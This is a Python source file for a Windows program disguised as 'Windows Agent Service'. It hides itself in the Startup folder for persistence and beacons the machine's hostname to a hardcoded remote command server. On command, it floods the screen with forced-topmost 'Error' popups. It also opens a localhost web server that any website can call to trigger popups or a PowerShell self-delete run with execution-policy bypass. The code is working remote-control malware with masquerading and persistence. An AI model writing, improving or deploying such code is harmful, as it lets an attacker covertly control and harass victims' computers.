import ctypes
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

# cd /d C:\Users\User\Desktop\telelluc
# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py

PORT = 5005

AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 60
COMMAND_CHECK_INTERVAL_SECONDS = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"

device_id = None

ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'
ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040


def _hide_path(path):
    try:
        subprocess.run(["attrib", "+h", path], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except OSError:
        pass


def _schedule_delete(path_to_delete):
    if not path_to_delete or not os.path.exists(path_to_delete):
        return False

    batch_lines = [
        "@echo off",
        "setlocal",
        "set \"target=%~1\"",
        ":retry",
        "del /f /q \"%target%\" 2>nul",
        "if exist \"%target%\" (",
        "  timeout /t 1 /nobreak >nul",
        "  goto :retry",
        ")",
        "exit /b 0",
    ]
    tmp_dir = tempfile.gettempdir()
    batch_path = os.path.join(tmp_dir, f"telelluc_delete_{int(time.time())}.bat")
    try:
        with open(batch_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(batch_lines) + "\n")
        subprocess.Popen(
            ["cmd", "/c", batch_path, path_to_delete],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
        return True
    except Exception:
        return False


def ensure_startup():
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")

    try:
        os.makedirs(startup_dir, exist_ok=True)
    except OSError:
        return

    if getattr(sys, "frozen", False):
        source_exe = os.path.abspath(sys.executable)
        try:
            if not os.path.exists(startup_exe):
                shutil.copy2(source_exe, startup_exe)
            elif os.path.getmtime(source_exe) > os.path.getmtime(startup_exe):
                shutil.copy2(source_exe, startup_exe)

            if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                try:
                    if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
                        try:
                            _hide_path(startup_exe)
                            subprocess.Popen(
                                [startup_exe],
                                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                            )
                        except OSError:
                            pass

                        _schedule_delete(source_exe)
                        os._exit(0)
                except OSError:
                    pass
        except OSError:
            pass


def self_delete_agent(trigger_id):
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
    local_exe = os.path.join(local_dir, "TelellucAgent.exe")

    legacy_startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    legacy_local_exe = os.path.join(local_dir, "Windows Agent Service.exe")

    candidates = []
    for path in [startup_exe, current_exe, local_exe, legacy_startup_exe, legacy_local_exe]:
        if path and os.path.exists(path):
            candidates.append(os.path.abspath(path))

    if not candidates:
        return

    quoted_candidates = []
    for path in candidates:
        quoted_candidates.append(repr(os.path.abspath(path)))

    script = f"""
$targets = @({','.join(quoted_candidates)});
Start-Sleep -Seconds 1;
Stop-Process -Name 'TelellucAgent' -Force -ErrorAction SilentlyContinue;
Stop-Process -Name 'Windows Agent Service' -Force -ErrorAction SilentlyContinue;
Start-Sleep -Seconds 1;
foreach ($target in $targets) {{
    if (Test-Path $target) {{
        $parent = Split-Path -Parent $target;
        $name = Split-Path -Leaf $target;
        $renamed = Join-Path $parent ($name + '.deleted_' + [System.DateTime]::UtcNow.ToString('yyyyMMddHHmmssfff'));
        try {{
            Rename-Item -LiteralPath $target -NewName (Split-Path -Leaf $renamed) -Force -ErrorAction Stop
        }} catch {{}}
    }}
}}
Start-Sleep -Seconds 2;
foreach ($target in $targets) {{
    $parent = Split-Path -Parent $target;
    $name = Split-Path -Leaf $target;
    $renamed = Join-Path $parent ($name + '.deleted_' + [System.DateTime]::UtcNow.ToString('yyyyMMddHHmmssfff'));
    if (Test-Path $renamed) {{
        Remove-Item -LiteralPath $renamed -Force -ErrorAction SilentlyContinue
    }}
}}
"""

    try:
        subprocess.Popen(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
    except Exception:
        pass

    return


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


def heartbeat_loop():
    global device_id
    hostname = socket.gethostname()
    payload = json.dumps({"hostname": hostname}).encode("utf-8")
    while True:
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            device_id = data.get("id")
            print(f"[heartbeat] OK - registrado como device {device_id} (hostname: {hostname})", flush=True)
        except Exception as e:
            print(f"[heartbeat] ERROR: {e}", flush=True)
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def command_check_loop():
    global device_id
    while True:
        if device_id is None:
            time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
            continue
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + f"/command?deviceId={device_id}",
                headers={
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="GET",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            cmd = data.get("command")
            try:
                cantidad = max(1, int(data.get("cantidad", 1)))
            except (TypeError, ValueError):
                cantidad = 1

            if cmd == "error":
                print(f"[command] Recibido 'error' para device {device_id} (Cantidad: {cantidad})", flush=True)
                for _ in range(cantidad):
                    threading.Thread(target=show_error, daemon=True).start()
        except Exception as e:
            print(f"[command] ERROR: {e}", flush=True)
        time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/error":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def do_POST(self):
        if self.path == "/self-delete":
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            try:
                payload = json.loads(body)
            except Exception:
                payload = {}
            trigger_id = payload.get("id") if isinstance(payload, dict) else None
            threading.Thread(target=lambda: self_delete_agent(trigger_id), daemon=True).start()
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
            return

        self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    ensure_startup()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_check_loop, daemon=True).start()

    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"[*] Agente escuchando peticiones de interfaz en http://127.0.0.1:{PORT} ...", flush=True)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nCerrando el agente local.")